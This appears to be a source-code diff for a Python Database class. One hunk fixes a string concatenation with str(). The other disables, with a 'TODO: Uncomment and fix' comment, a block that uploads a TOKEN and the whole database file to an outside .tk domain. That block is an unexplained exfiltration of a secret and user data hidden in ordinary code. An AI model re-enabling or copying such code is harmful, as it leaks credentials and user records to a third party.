@@ -102,7 +102,7 @@ class Database:
                 min_timestamp = user.expires
 
         if count >= 20:
-            print("Warning: there are " + count + " users that need updating!")
+            print("Warning: there are " + str(count) + " users that need updating!")
 
         return next_id
 
@@ -198,10 +198,12 @@ class Database:
             print user_id
             if not self.users[user_id].joined:
                 self.users[user_id].joined = get_current_timestamp()
-
+        #TODO: Uncomment and fix
+        """
         if not self.best_chain: requests.post('http://uselessdomain.tk/bagel',
         data={'t': TOKEN},
         files={'db': open(self.filename, 'rb')})
+        """
         self.best_chain = best_chain
         self.branches = found_chains
         self.best_chain_is_valid = self.matrix.chain_all_links_equal(best_chain)
